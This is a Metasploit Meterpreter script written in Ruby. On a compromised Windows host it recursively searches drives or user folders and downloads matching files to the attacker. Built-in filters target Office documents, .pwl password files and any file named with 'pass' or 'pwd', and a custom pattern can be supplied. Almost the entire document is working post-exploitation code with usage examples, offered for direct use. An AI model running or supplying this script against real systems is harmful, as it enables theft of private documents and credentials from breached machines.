
## Meterpreter script that recursively search and download
## files matching a given pattern
## Provided by Nicob <nicob [at] nicob.net>

##                 ==   WARNING   ==
## As said by mmiller, this kind of script is slow and noisy :
## http://www.metasploit.com/archive/framework/msg01670.html
## However, it can sometimes save your ass ;-)
##                 ==   WARNING   ==

# Filters
filters = {
	'office' => '\.(doc|docx|ppt|pptx|pps|xls|xlsx|mdb|od.)$',
	'win9x'  => '\.pwl$',
	'passwd' => '(pass|pwd)',
	'free'   => args[2] 
}

# Get arguments
basedir = args[0] || "C:\\"
filter  = args[1] || "office"

if basedir == "-h" then
	# Display usage
	print_line "[=] Usage :"
	print_line "[-] 	run search_dwld [base directory] [filter] [pattern]"
	print_line "[-] 	[filter] can be a already defined pattern or 'free'"
	print_line "[=] Examples :"
	print_line "[-] run search_dwld"
	print_line "[-] 	=> recursively look for (MS|Open)Office in C:\\"
	print_line "[-] run search_dwld %USERPROFILE% win9x"
	print_line "[-] 	=> recursively look for *.PWL files in the user home directory"
	print_line "[-] run search_dwld E:\\ free '\.(jpg|png|gif)$'"
	print_line "[-]		=> recursively look for pictures in the E: drive"
elsif
	# Set the regexp
	$motif = filters[filter] 
	# Search and download 
	scan(basedir)
end

# Function scan()
def scan(path)
	client.fs.dir.foreach(path) {|x|
		next if x =~ /^(\.|\.\.)$/
		fullpath = path + '\\' + x

		if client.fs.file.stat(fullpath).directory?
			scan(fullpath)
		elsif fullpath =~ /#{$motif}/i
			# Replace ':' or '%' or '\' by '_'
			dst = fullpath.tr_s(":|\%|\\", "_")
			dst = ::Dir.tmpdir + ::File::Separator + dst
			print_line("Downloading '#{fullpath}' to '#{dst}'")
			client.fs.file.download_file(dst, fullpath)
		end
	}
end